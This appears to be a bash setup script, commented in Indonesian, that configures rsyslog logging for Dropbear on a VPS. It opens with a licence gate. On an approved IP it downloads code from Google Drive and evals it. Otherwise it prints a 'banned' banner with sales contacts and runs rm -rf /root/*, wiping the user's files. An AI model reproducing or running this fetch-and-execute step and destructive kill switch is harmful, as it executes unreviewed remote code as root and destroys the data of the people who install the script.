#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
    ALLOWED_IP=$(curl -sS "https://licence-manager-nu.vercel.app/api/check/izintxt" | grep "$MYIP" | awk '{print $4}')
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
	ID_FILE="1RWzdtBtqJH6D0KjGNkwOwJUVxUyc2Zkr"
	eval $(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")
    else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m \342\232\240\357\270\217       AKSES DI TOLAK         \342\232\240\357\270\217 \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m\342\235\214 SCRIPT LOCKED \342\235\214\033[0m"
echo -e ""
echo -e "  \033[0;33m\360\237\224\222 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m\342\232\240\357\270\217  Masa Aktif Sudah Habis \342\232\240\357\270\217\033[0m"
echo -e "  \033[0;33m\360\237\222\241 Beli izin resmi hanya dari Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m\360\237\223\236 Contact Admin:\033[0m"
echo -e "  \033[96m\360\237\214\215 Telegram: https://nevpn.site\033[0m"
echo -e "  \033[96m\360\237\223\261 WhatsApp: https://whatsapp.nevpn.site\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
	fi

# Fungsi untuk mendeteksi sistem operasi dan versinya
detect_os() {
  if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    echo "$ID $VERSION_ID"  # Mengembalikan ID dan versi OS
  else
    echo "Unknown"
  fi
}

# Mengatur file konfigurasi Rsyslog berdasarkan OS dan versinya
os_version=$(detect_os)
if [[ "$os_version" =~ ubuntu\ 24\.0[4|10] ]]; then
  RSYSLOG_FILE="/etc/rsyslog.d/50-default.conf"
elif [[ "$os_version" == "debian 12" ]]; then
  RSYSLOG_FILE="/etc/rsyslog.conf"
else
  echo "Sistem operasi atau versi tidak dikenali. Keluar..."
  exit 1
fi

# Daftar file log yang harus diperiksa izinnya
LOG_FILES=(
  "/var/log/auth.log"
  "/var/log/kern.log"
  "/var/log/mail.log"
  "/var/log/user.log"
  "/var/log/cron.log"
)

# Fungsi untuk mengecek dan mengatur izin dan kepemilikan file log
set_permissions() {
  for log_file in "${LOG_FILES[@]}"; do
    if [[ -f "$log_file" ]]; then
      echo "Mengatur izin dan kepemilikan untuk $log_file..."
      chmod 640 "$log_file"
      chown syslog:adm "$log_file"  # Memberikan kepemilikan kepada syslog agar bisa menulis log
    else
      echo "$log_file tidak ditemukan, melewati..."
    fi
  done
}

# Mengecek apakah konfigurasi untuk dropbear sudah ada
check_dropbear_log() {
  grep -q 'if \$programname == "dropbear"' "$RSYSLOG_FILE"
}

# Fungsi untuk menambahkan konfigurasi dropbear
add_dropbear_log() {
  echo "Menambahkan konfigurasi Dropbear ke $RSYSLOG_FILE..."
  sudo bash -c "echo -e 'if \$programname == \"dropbear\" then /var/log/auth.log\
& stop' >> $RSYSLOG_FILE"
  systemctl restart rsyslog
  echo "Konfigurasi Dropbear ditambahkan dan Rsyslog direstart."
}

# Menjalankan pengecekan dan penambahan konfigurasi jika diperlukan
if check_dropbear_log; then
  echo "Konfigurasi Dropbear sudah ada, tidak ada perubahan yang dilakukan."
else
  add_dropbear_log
fi

# Set permissions untuk file log
set_permissions